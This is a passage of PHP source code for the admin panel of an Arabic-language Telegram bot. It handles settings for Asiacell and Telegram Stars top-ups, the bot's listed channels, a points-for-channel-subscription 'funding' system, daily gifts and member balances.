[['text'=>"تعيين كليشه الشروط ",'callback_data'=>"settext"],['text'=>"تعيين كليشه الشراء ",'callback_data'=>"setbuy"]],
[['text'=>"كليشه الاثبات في القنوات ",'callback_data'=>"set_channel_proof"]],
[['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
]
];
$funding_settings = [
'inline_keyboard'=>[
[['text'=>"فتح التمويل 🔓",'callback_data'=>"funding_toggle_on"], ['text'=>"قفل التمويل 🔒",'callback_data'=>"funding_toggle_off"]],
[['text'=>"تعيين شروط التمويل 📜",'callback_data'=>"set_funding_terms"]],
[['text'=>"تعيين ادنى حد للتمويل 🔻",'callback_data'=>"set_min_funding"]],
[['text'=>"تعيين سعر العضو 💰",'callback_data'=>"set_funding_price"]],
[['text'=>"تعيين نقاط الاشتراك في القنوات 🎁",'callback_data'=>"set_join_points"]],
[['text'=>"تعيين نقاط خصم المغادرة ⚠️",'callback_data'=>"set_leave_penalty"]],
[['text'=>"ادارة قنوات التمويل ",'callback_data'=>"admin_funding_panel"]],
[['text'=>"الاستعلام عن قناة ",'callback_data'=>"query_funding_channel"]],
[['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
]
];
$gift_settings = [
'inline_keyboard'=>[
[['text'=>"فتح الهديه اليومي 🎁",'callback_data'=>"onhdia"], ['text'=>"قفل الهديه اليومي 🔒",'callback_data'=>"ofhdia"]],
[['text'=>"تعيين عدد الهديه 🔢",'callback_data'=>"sethdia"]],
[['text'=>"صنع كود هديه 🆕",'callback_data'=>"hdiamk"]],
[['text'=>"فتح التحويل 🔓",'callback_data'=>"open_transfer"], ['text'=>"قفل التحويل 🔒",'callback_data'=>"close_transfer"]],
[['text'=>"تعيين اقل حد للتحويل 🔻",'callback_data'=>"set_min_transfer"]],
[['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
]
];
$member_control = [
'inline_keyboard'=>[
[['text'=>"اضافه او خصم رصيد ➕➖",'callback_data'=>"coins"]],
[['text'=>"تصفير نقاط شخص 🗑️",'callback_data'=>"msfrn"]],
[['text'=>"معلومات العضو 📋",'callback_data'=>"member_info"]],
[['text'=>"اخر 5 طلبات للعضو 📝",'callback_data'=>"member_orders"]],
[['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
]
];




if(!isset($rshq['asia_stats'])) $rshq['asia_stats'] = ['attempts'=>0, 'users_attempted'=>[], 'completed'=>0, 'users_completed'=>[], 'total_iqd'=>0, 'total_points'=>0];
if(!isset($rshq['stars_stats'])) $rshq['stars_stats'] = ['attempts'=>0, 'users_attempted'=>[], 'completed'=>0, 'users_completed'=>[], 'total_stars'=>0];

if($data == "auto_charge_settings"){
    $keys = [
        'inline_keyboard' => [
            [['text' => "إعدادات الشحن اسياسيل 🔴", 'callback_data' => "asia_charge_settings"]],
            [['text' => "إعدادات الشحن نجوم ⭐", 'callback_data' => "stars_charge_settings"]],
            [['text' => "رجوع ⬅️", 'callback_data' => "general_settings"]]
        ]
    ];
    bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"💳 *مرحباً بك في قسم الشحن التلقائي*\n\nاختر وسيلة الدفع التي تريد إدارتها من الأسفل:",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($keys)
    ]);
}

if($data == "toggle_asia_status"){ $rshq['asia_settings']['status'] = ($rshq['asia_settings']['status'] ?? 'on') == 'on' ? 'off' : 'on'; SETJSON($rshq); $data = "asia_charge_settings"; }
if($data == "toggle_asia_success"){ $rshq['asia_settings']['success_notif'] = ($rshq['asia_settings']['success_notif'] ?? 'on') == 'on' ? 'off' : 'on'; SETJSON($rshq); $data = "asia_charge_settings"; }
if($data == "toggle_asia_fail"){ $rshq['asia_settings']['fail_notif'] = ($rshq['asia_settings']['fail_notif'] ?? 'on') == 'on' ? 'off' : 'on'; SETJSON($rshq); $data = "asia_charge_settings"; }

if($data == "asia_charge_settings"){
    $status = ($rshq['asia_settings']['status'] ?? 'on') == "on" ? "✅ مفعل" : "❌ معطل";
    $fail_notif = ($rshq['asia_settings']['fail_notif'] ?? 'on') == "on" ? "✅" : "❌";
    $success_notif = ($rshq['asia_settings']['success_notif'] ?? 'on') == "on" ? "✅" : "❌";
    
    $keys = [
        'inline_keyboard' => [
            [['text' => "حالة الشحن: $status", 'callback_data' => "toggle_asia_status"]],
            [['text' => "رقم المستلم 📱", 'callback_data' => "set_asia_number"], ['text' => "سعر النقاط 💰", 'callback_data' => "set_asia_points"]],
            [['text' => "الحد الأدنى 🔽", 'callback_data' => "set_asia_min"], ['text' => "الحد الأقصى 🔼", 'callback_data' => "set_asia_max"]],
            [['text' => "إشعار الدفع: $success_notif", 'callback_data' => "toggle_asia_success"], ['text' => "إشعار الفشل: $fail_notif", 'callback_data' => "toggle_asia_fail"]],
            [['text' => "📊 إحصائيات الدفع", 'callback_data' => "asia_charge_stats"]],
            [['text' => "رجوع ⬅️", 'callback_data' => "auto_charge_settings"]]
        ]
    ];
    bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"🔴 *إعدادات الشحن التلقائي عبر آسياسيل*\n\nالرقم: `".($rshq['asia_settings']['receive_number'] ?? "غير محدد")."`\nسعر النقاط: `".($rshq['asia_settings']['points_per_asia'] ?? 1)."` نقطة لكل دينار\nالحد الأدنى: `".($rshq['asia_settings']['min'] ?? 1)."`\nالحد الأقصى: `".($rshq['asia_settings']['max'] ?? 60)."`",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($keys)
    ]);
}

$asia_inputs = ['set_asia_number'=>'رقم الاستلام', 'set_asia_points'=>'سعر النقاط', 'set_asia_min'=>'الحد الأدنى', 'set_asia_max'=>'الحد الأقصى'];
if(isset($asia_inputs[$data])){
    bot('EditMessageText',['chat_id'=>$chat_id,'message_id'=>$message_id,'text'=>"📌 أرسل ".$asia_inputs[$data]." الجديد الآن (بالأرقام فقط):",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"asia_charge_settings"]]]])]);
    $rshq['mode'][$from_id] = $data;
    SETJSON($rshq);
}
if($text && in_array($rshq['mode'][$from_id] ?? '', array_keys($asia_inputs))){
    $mode = $rshq['mode'][$from_id];
    if($mode == 'set_asia_number') $rshq['asia_settings']['receive_number'] = $text;
    elseif($mode == 'set_asia_points' && is_numeric($text)) $rshq['asia_settings']['points_per_asia'] = $text;
    elseif($mode == 'set_asia_min' && is_numeric($text)) $rshq['asia_settings']['min'] = $text;
    elseif($mode == 'set_asia_max' && is_numeric($text)) $rshq['asia_settings']['max'] = $text;
    
    $rshq['mode'][$from_id] = null;
    SETJSON($rshq);
    bot('sendMessage',['chat_id'=>$chat_id,'text'=>"✅ تم الحفظ بنجاح!",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"asia_charge_settings"]]]])]);
    exit;
}

if($data == "asia_charge_stats"){
    $stats = $rshq['asia_stats'];
    $u_att = count($stats['users_attempted']);
    $u_com = count($stats['users_completed']);
    $success_rate = $stats['attempts'] > 0 ? round(($stats['completed'] / $stats['attempts']) * 100) : 0;
    
    $msg = "📊 *إحصائيات الدفع عبر اسياسيل*\n- الفترة: جميع الأوقات\n\n";
    $msg .= "🔍 *المحاولات:* {$stats['attempts']}\n👥 مستخدمين فريدين: {$u_att}\n\n";
    $msg .= "✅ *المكتملة:* {$stats['completed']}\n👥 مستخدمين أتمّوا الدفع: {$u_com}\n\n";
    $msg .= "💰 إجمالي الدنانير: {$stats['total_iqd']} IQD\n⭐ إجمالي النقاط: {$stats['total_points']} نقطة\n\n";
    $msg .= "📈 نسبة النجاح: {$success_rate}%\n";
    
    bot('EditMessageText',['chat_id'=>$chat_id,'message_id'=>$message_id,'text'=>$msg,'parse_mode'=>'markdown','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"asia_charge_settings"]]]])]);
}


if($data == "toggle_stars_status"){ $rshq['stars_settings']['status'] = ($rshq['stars_settings']['status'] ?? 'on') == 'on' ? 'off' : 'on'; SETJSON($rshq); $data = "stars_charge_settings"; }

if($data == "stars_charge_settings"){
    $status = ($rshq['stars_settings']['status'] ?? 'on') == "on" ? "✅ مفعل" : "❌ معطل";
    $keys = [
        'inline_keyboard' => [
            [['text' => "حالة الشحن: $status", 'callback_data' => "toggle_stars_status"]],
            [['text' => "سعر النجمة ⭐", 'callback_data' => "set_stars_points"]],
            [['text' => "الحد الأدنى 🔽", 'callback_data' => "set_stars_min"], ['text' => "الحد الأقصى 🔼", 'callback_data' => "set_stars_max"]],
            [['text' => "🪙 إحصائيات المدفوعات", 'callback_data' => "stars_charge_stats"]],
            [['text' => "رجوع ⬅️", 'callback_data' => "auto_charge_settings"]]
        ]
    ];
    bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"⭐ *إعدادات الشحن التلقائي عبر النجوم*\n\nسعر النجمة: `".($rshq['stars_settings']['points_per_star'] ?? 10)."` نقطة\nالحد الأدنى: `".($rshq['stars_settings']['min'] ?? 1)."`\nالحد الأقصى: `".($rshq['stars_settings']['max'] ?? 1000)."`",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($keys)
    ]);
}

$stars_inputs = ['set_stars_points'=>'سعر النجمة', 'set_stars_min'=>'الحد الأدنى', 'set_stars_max'=>'الحد الأقصى'];
if(isset($stars_inputs[$data])){
    bot('EditMessageText',['chat_id'=>$chat_id,'message_id'=>$message_id,'text'=>"📌 أرسل ".$stars_inputs[$data]." الجديد الآن (بالأرقام فقط):",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"stars_charge_settings"]]]])]);
    $rshq['mode'][$from_id] = $data;
    SETJSON($rshq);
}
if($text && in_array($rshq['mode'][$from_id] ?? '', array_keys($stars_inputs)) && is_numeric($text)){
    $mode = $rshq['mode'][$from_id];
    if($mode == 'set_stars_points') $rshq['stars_settings']['points_per_star'] = $text;
    elseif($mode == 'set_stars_min') $rshq['stars_settings']['min'] = $text;
    elseif($mode == 'set_stars_max') $rshq['stars_settings']['max'] = $text;
    
    $rshq['mode'][$from_id] = null;
    SETJSON($rshq);
    bot('sendMessage',['chat_id'=>$chat_id,'text'=>"✅ تم الحفظ بنجاح!",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"stars_charge_settings"]]]])]);
    exit;
}

if($data == "stars_charge_stats"){
    $stats = $rshq['stars_stats'];
    $u_att = count($stats['users_attempted']);
    $u_com = count($stats['users_completed']);
    $success_rate = $stats['attempts'] > 0 ? round(($stats['completed'] / $stats['attempts']) * 100) : 0;
    
    $msg = "🪙 *إحصائيات المدفوعات 📊*\n- الفترة: جميع الأوقات\n\n";
    $msg .= "🔍 *المحاولات:*\n- عدد مرات الدخول على رابط الدفع: {$stats['attempts']}\n- عدد المستخدمين الذين حاولوا الدفع: {$u_att}\n\n";
    $msg .= "✅ *المكتملة:*\n- عدد الدفعات المكتملة بنجاح: {$stats['completed']}\n- عدد المستخدمين الذين أتمّوا الدفع بنجاح: {$u_com}\n\n";
    $msg .= "🌟 *إجمالي النجوم المستلمة:*\n- {$stats['total_stars']} نجمة\n\n";
    $msg .= "📈 *نسبة النجاح:*\n- نسبة الفواتير المدفوعة إلى الفواتير المنشأة: {$success_rate}%\n";
    
    bot('EditMessageText',['chat_id'=>$chat_id,'message_id'=>$message_id,'text'=>$msg,'parse_mode'=>'markdown','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"stars_charge_settings"]]]])]);
}
if($data == "admin_bot_channels"){
$key = ['inline_keyboard' => []];
if(isset($rshq['bot_channels']) && is_array($rshq['bot_channels'])){
foreach($rshq['bot_channels'] as $channel_id => $channel){
$key['inline_keyboard'][] = [['text' => $channel['name'], 'callback_data' => "edit_bot_channel|$channel_id"], ['text' => "🗑", 'callback_data' => "delete_bot_channel|$channel_id"]];
}
}

$key['inline_keyboard'][] = [['text' => "+ اضافه قناة جديده", 'callback_data' => "add_bot_channel"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "general_settings"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*قنوات البوت 📢
يمكنك اضافة قنوات البوت التي تظهر للمستخدمين
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "add_bot_channel"){
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل اسم القناة (العنوان الذي سيظهر للمستخدم)
مثال: قناة البوت الرسمية
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "admin_bot_channels"]],
]
])
]);
$rshq['mode'][$from_id] = "add_bot_channel_name";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "add_bot_channel_name"){
$rshq['temp_channel_name'] = $text;
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*الان ارسل رابط القناة (مع https://t.me/ https://t.me/kilwaBots)
مثال: 
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"admin_bot_channels"]],
]
])
]);
$rshq['mode'][$from_id] = "add_bot_channel_link";
SETJSON($rshq);
exit; 
}
if($text and $rshq['mode'][$from_id] == "add_bot_channel_link"){
$channel_name = $rshq['temp_channel_name'];
$channel_link = $text;
if(!isset($rshq['bot_channels'])) $rshq['bot_channels'] = [];
$channel_id = "channel_".rand(100000,999999);
$rshq['bot_channels'][$channel_id] = [
'name' => $channel_name,
'link' => $channel_link
];
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم اضافه قناة $channel_name بنجاح ✅
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"admin_bot_channels"]],
]
])
]);
$rshq['mode'][$from_id] = null;
$rshq['temp_channel_name'] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "edit_bot_channel"){
$channel_id = explode("|",$data)[1];
$channel = $rshq['bot_channels'][$channel_id];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "تعديل الاسم", 'callback_data' => "edit_channel_name|$channel_id"]];
$key['inline_keyboard'][] = [['text' => "تعديل الرابط", 'callback_data' => "edit_channel_link|$channel_id"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "admin_bot_channels"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*القناة: ".$channel['name']."
الرابط: ".$channel['link']."*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if(explode("|",$data)[0] == "edit_channel_name"){
$channel_id = explode("|",$data)[1];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل الاسم الجديد للقناة
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "edit_bot_channel|$channel_id"]],
]
])
]);
$rshq['mode'][$from_id] = "edit_channel_name_$channel_id";
SETJSON($rshq);
}
if($text and strpos($rshq['mode'][$from_id], "edit_channel_name_") === 0){
$channel_id = str_replace("edit_channel_name_", "", $rshq['mode'][$from_id]);
$rshq['bot_channels'][$channel_id]['name'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعديل اسم القناة بنجاح ✅
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"admin_bot_channels"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "edit_channel_link"){
$channel_id = explode("|",$data)[1];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل الرابط الجديد للقناة
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "edit_bot_channel|$channel_id"]],
]
])
]);
$rshq['mode'][$from_id] = "edit_channel_link_$channel_id";
SETJSON($rshq);
}
if($text and strpos($rshq['mode'][$from_id], "edit_channel_link_") === 0){
$channel_id = str_replace("edit_channel_link_", "", $rshq['mode'][$from_id]);
$rshq['bot_channels'][$channel_id]['link'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعديل رابط القناة بنجاح ✅
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"admin_bot_channels"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "delete_bot_channel"){
$channel_id = explode("|",$data)[1];
unset($rshq['bot_channels'][$channel_id]);
SETJSON($rshq);
$key = ['inline_keyboard' => []];
if(isset($rshq['bot_channels']) && is_array($rshq['bot_channels'])){
foreach($rshq['bot_channels'] as $cid => $channel){
$key['inline_keyboard'][] = [['text' => $channel['name'], 'callback_data' => "edit_bot_channel|$cid"], ['text' => "🗑", 'callback_data' => "delete_bot_channel|$cid"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه قناة جديده", 'callback_data' => "add_bot_channel"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "general_settings"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*تم حذف القناة بنجاح ✅
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "admin_funding_settings"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*اعدادات نظام التمويل 💰
يمكنك التحكم في جميع اعدادات التمويل من هنا
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($funding_settings)
]);
}
if($data == "query_funding_channel"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل يوزر القناة (مع @ او بدون)*\nمثال: [@channel_username]",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"admin_funding_settings"]],
]
])
]);
$rshq['mode'][$from_id] = "query_funding_channel";
SETJSON($rshq);
}

if($text && $rshq['mode'][$from_id] == "query_funding_channel"){

$channel_user = str_replace("@", "", $text);
$found = false;
$funding_status = $rshq['funding_status'] ?? "on";

if(!empty($tmoil['db']['chs'])){
foreach($tmoil['db']['chs'] as $chs){

if($chs == $channel_user){

$idM = $tmoil['chanels']["id_$chs"];
$ci = $tmoil['db'][$idM]['count'];
$startc = $tmoil['db'][$idM]['startc'];

$vx = max(0, $ci - $startc);

$status_text = $funding_status == "on" ? "✅ مفعل" : "❌ معطل";

$owner = $tmoil['db'][$idM]['owner'];

if(is_numeric($owner)){
$owner_text = "[$owner](tg://user?id=$owner)";
}else{
$owner_text = $owner;
}

$details = "🔍 تفاصيل القناة [@$channel_user] 📡\n";
$details .= "📌 العدد المطلوب: $ci\n";
$details .= "📈 العدد المتبقي: $vx\n";
$details .= "👤 المالك: $owner_text\n";
$details .= "⚙️ حالة النظام: $status_text";

bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>$details,
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ازاله القناة من التمويل 🗑",'callback_data'=>"delete_fund_channel_admin|$channel_user"]],
[['text'=>$NamesBACK,'callback_data'=>"admin_funding_settings"]],
]
])
]);

$found = true;
break;

}
}
}

if(!$found){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌ لم يتم العثور على قناة [@$channel_user] في قائمة التمويل",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"admin_funding_settings"]],
]
])
]);
}

$rshq['mode'][$from_id] = null;
SETJSON($rshq);

}
if($data_[0] == "delete_fund_channel_admin"){
$channel_user = $data_[1];
$st = array_search($channel_user, $tmoil['db']["chs"]);
if($st !== false){
unset($tmoil['db']["chs"][$st]);
$tmoil['db']["chs"] = array_values($tmoil['db']["chs"]);
$idM = $tmoil['chanels']["id_$channel_user"];
unset($tmoil['db'][$idM]);
unset($tmoil['chanels']["id_$channel_user"]);
SETJSON1($tmoil);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"✅ تم ازاله قناة @$channel_user من التمويل بنجاح",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"admin_funding_settings"]],
]
])
]);
}else{
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"❌ القناة غير موجودة",
'show_alert'=>true
]);
}
}
if($data == "set_funding_terms"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل شروط التمويل الجديدة
يمكنك استخدام:
{min_count} - الحد الأدنى للتمويل
{price} - سعر العضو
{currency} - اسم العملة
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_funding_terms";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "set_funding_terms"){
$tmoil['funding_terms'] = $text;
SETJSON1($tmoil);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين شروط التمويل بنجاح ✅
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "funding_toggle_on"){
$rshq['funding_status'] = "on";
SETJSON($rshq);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تم فتح نظام التمويل بنجاح ✅
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"admin_funding_settings"]],
]
])
]);
}
if($data == "funding_toggle_off"){
$rshq['funding_status'] = "off";
SETJSON($rshq);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تم قفل نظام التمويل بنجاح ❌
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"admin_funding_settings"]],
]
])
]);
}
if($data == "set_min_funding"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل ادنى حد للتمويل (عدد الاعضاء) بالارقام فقط
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_min_funding";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "set_min_funding"){
$tmoil["tmoils"] = $text;
SETJSON1($tmoil);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين ادنى حد للتمويل: $text عضو
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "set_funding_price"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل سعر العضو الواحد بالارقام فقط
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_funding_price";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "set_funding_price"){
$rshq["s3rtmoil"] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين سعر العضو: $text $currency_name
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "set_join_points"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل عدد نقاط الاشتراك في القنوات بالارقام فقط
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_join_points";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "set_join_points"){
$rshq["coinNmero"] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين نقاط الاشتراك في القنوات: $text $currency_name
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}

if($data == "set_leave_penalty"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل عدد نقاط خصم المغادرة من القنوات بالارقام فقط
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_leave_penalty";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "set_leave_penalty"){
$rshq["leave_penalty"] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين نقاط خصم المغادرة: $text $currency_name
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "admin_funding_panel"){

$buttons = [];

if(!empty($tmoil['db']['chs'])){
foreach($tmoil['db']['chs'] as $chs){

$idM = $tmoil['chanels']["id_$chs"] ?? null;

if(!$idM || !isset($tmoil['db'][$idM])) continue;

$ci = $tmoil['db'][$idM]["count"];
$startc = $tmoil['db'][$idM]["startc"];

$vx = max(0, $ci - $startc);

$buttons[] = [[
'text'=>"[@$chs] 📡 (✅ $vx / $ci)",
'callback_data'=>"show_fund_admin|$chs"
]];

}
}

$buttons[] = [['text'=>"رجوع ⬅️", 'callback_data'=>"admin_funding_settings"]];

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"- لوحة إدارة تمويل القنوات 👮‍♂️",
'reply_markup'=>json_encode(['inline_keyboard'=>$buttons])
]);

}


if($data_[0] == "show_fund_admin"){

$chs = $data_[1];
$idM = $tmoil['chanels']["id_$chs"] ?? null;

if(!$idM || !isset($tmoil['db'][$idM])){
bot('answerCallbackQuery', [
'callback_query_id'=>$update->callback_query->id,
'text'=>"القناة غير موجودة"
]);
return;
}

$ci = $tmoil['db'][$idM]["count"];
$startc = $tmoil['db'][$idM]["startc"];

$vx = max(0, $ci - $startc);

$owner = $tmoil['db'][$idM]["owner"];

if(is_numeric($owner)){
$owner_text = "[$owner](tg://user?id=$owner)";
}else{
$owner_text = $owner;
}

$create = $tmoil['db'][$idM]["create"] ?? "غير محدد";

$buttons = [
[['text'=>"❌ حذف القناة", 'callback_data'=>"delete_fund_channel|$chs"]],
[['text'=>"⬅️ رجوع", 'callback_data'=>"admin_funding_panel"]]
];

$text = "تفاصيل القناة [@$chs] 📡\n";
$text .= "📌 العدد المطلوب: $ci\n";
$text .= "📈 المتبقي: $vx\n";
$text .= "👤 المالك: $owner_text\n";
$text .= "📅 تاريخ الإنشاء: $create";

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>$text,
'parse_mode'=>"markdown",
'reply_markup'=>json_encode(['inline_keyboard'=>$buttons])
]);

}

if($data_[0] == "delete_fund_channel"){
$chs = $data_[1];
$idM = $tmoil['chanels']["id_$chs"];
if($idM){
unset($tmoil['db'][$idM]);
unset($tmoil['chanels']["id_$chs"]);
$index = array_search($chs, $tmoil['db']['chs']);
if($index !== false) unset($tmoil['db']['chs'][$index]);
$tmoil['db']['chs'] = array_values($tmoil['db']['chs']);
SETJSON1($tmoil);
}
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"✅ تم حذف قناة @$chs من التمويل بنجاح.",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع ⬅️", 'callback_data'=>"admin_funding_panel"]]
]])
]);
}/*
if($data == "set_start_message"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل رساله الستارت الجديده
يمكنك استخدام الهاشتاجات التاليه:
#username - اسم المستخدم
#user_id - ايدي المستخدم
#first_name - الاسم الاول
#balance - الرصيد
#invites - عدد الدعوات
#orders_count - عدد الطلبات
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_start_message";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "set_start_message"){
$rshq['start_message'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين رساله الستارت بنجاح
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}*/
if($data == "set_channel_proof"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل كليشه الاثبات في القنوات\n\nيمكنك استخدام الهاشتاجات التاليه:\n#username - اسم المستخدم\n#user_id - ايدي المستخدم\n#first_name - الاسم الاول\n#order_id - ايدي الطلب\n#service_name - اسم الخدمه\n#quantity - الكميه\n#link - الرابط\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
